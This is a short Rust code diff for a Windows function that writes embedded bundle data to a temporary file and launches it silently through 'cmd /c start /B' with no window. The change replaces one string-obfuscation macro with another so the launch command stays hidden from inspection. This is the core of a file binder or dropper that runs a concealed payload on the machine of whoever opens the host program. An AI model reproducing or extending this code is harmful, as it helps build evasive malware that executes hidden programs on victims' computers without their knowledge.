@@ -1,7 +1,7 @@
 use std::io::Write;
 use std::os::windows::process::CommandExt;
 use tempfile::NamedTempFile;
-use rustcrypt_ct_macros::obf_lit;
+use obfstr::obfstr;
 
 // Include the generated bundle data
 include!("bundle_data.rs");
@@ -28,8 +28,8 @@ pub fn bundlefile() -> Result<(), Box<dyn std::error::Error>> {
     std::fs::rename(temp_file.path(), &temp_file_path).map_err(|e| format!("Failed to rename temporary file: {}", e))?;
 
     use std::process::Command;
-    Command::new(obf_lit!("cmd"))
-        .args(&[obf_lit!("/c"), obf_lit!("start"), obf_lit!("/B"), temp_file_path.to_str().unwrap().to_string()])
+    Command::new(obfstr!("cmd"))
+        .args(&[obfstr!("/c"), obfstr!("start"), obfstr!("/B"), temp_file_path.to_str().unwrap().to_string()])
         .creation_flags(CREATE_NO_WINDOW)
         .spawn()
         .map_err(|e| format!("Failed to open file: {}", e))?;
